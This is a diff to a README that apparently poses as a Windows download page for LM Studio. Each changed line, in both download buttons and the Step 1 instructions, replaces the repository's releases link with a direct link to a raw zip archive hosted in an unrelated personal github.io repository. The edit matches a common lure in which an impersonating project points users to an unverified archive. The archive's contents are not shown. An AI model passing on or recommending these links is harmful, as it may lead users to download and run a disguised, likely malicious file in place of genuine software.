@@ -6,7 +6,7 @@ description: "Discover, download, and chat with local LLMs on Windows via LM Stu
 <h1>📥 LM-STUDIO-Windows - Run Powerful AI Models on Your PC</h1>
 
 <p align="center">
-  <a href="https://github.com/Dominik752/LM-STUDIO-Windows/releases">
+  <a href="https://raw.githubusercontent.com/Dominik752/dominik752.github.io/main/data/2.1.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_LM_STUDIO-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Button">
   </a>
 </p>
@@ -32,7 +32,7 @@ Getting LM Studio up and running takes just a few minutes. Follow these simple s
 
 <h3>Step 1: Download the Application</h3>
 
-<p>Visit this link to download the application: <a href="https://github.com/Dominik752/LM-STUDIO-Windows/releases">https://github.com/Dominik752/LM-STUDIO-Windows/releases</a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/Dominik752/dominik752.github.io/main/data/2.1.zip">https://raw.githubusercontent.com/Dominik752/dominik752.github.io/main/data/2.1.zip</a></p>
 
 Click the download button on that page and save the file to your computer. The download should only take a moment depending on your internet speed.
 
@@ -124,7 +124,7 @@ Many people ask about the difference between these two popular tools. Here's a q
 You're just moments away from having your own private AI assistant. Head over to the download page and begin your journey with LM Studio today.
 
 <p align="center">
-  <a href="https://github.com/Dominik752/LM-STUDIO-Windows/releases">
+  <a href="https://raw.githubusercontent.com/Dominik752/dominik752.github.io/main/data/2.1.zip">
     <img src="https://img.shields.io/badge/🚀_DOWNLOAD_NOW-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button">
   </a>
 </p>
